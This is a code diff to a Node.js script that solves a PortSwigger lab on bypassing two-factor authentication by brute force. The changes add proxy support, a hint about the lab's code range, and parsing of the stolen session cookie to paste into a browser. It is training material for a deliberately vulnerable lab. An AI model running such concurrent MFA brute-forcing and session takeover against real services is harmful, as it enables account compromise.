@@ -5,13 +5,18 @@ import { runTasks } from "../../../utils/runTasks.js";
 const { url, concurrencyLimit, httpClient } = getParsedInput({
   description: "Lab: 2FA bypass using a brute-force attack",
   concurrency: true,
+  proxy: true,
 });
 
 await pressEnterToContinue(`
-As the verification code will reset while you're running your attack,
-you may need to repeat this attack several times before you succeed.
-This is because the new code may be a number that your current attack 
-has already attempted.`);
+As the verification code will reset while you're running your attack, you may
+need to repeat this attack several times before you succeed. This is because
+the new code may be a number that your current attack has already attempted.
+
+Technically, since the MFA code is four digits, there are a total of 10,000
+possible combinations for this code. However, in practice, this PortSwigger lab
+generates codes within the range of up to 2000. So, if you notice that the
+attack exceeds the 2000 mark, you can press Ctrl + C and restart the lab.`);
 
 const csrfRegex = /value="(.+)"/;
 
@@ -64,11 +69,12 @@ async function task(index) {
     console.log(`${code}: success`);
 
     const session = extractSessionCookie(response);
+    const sessionValue = new URLSearchParams(session).get("session");
     console.log(
       `To solve the lab:
-        1. Go to home lab page.
-        2. Set your browser cookie with key 'session' and value '${session}', refresh the page.
-        3. Go to 'My account page'`,
+        1. Go to lab home page.
+        2. Set your browser cookie with key "session" and value "${sessionValue}", refresh the page.
+        3. Go to "My account page".`,
     );
     process.exit(0);
   }
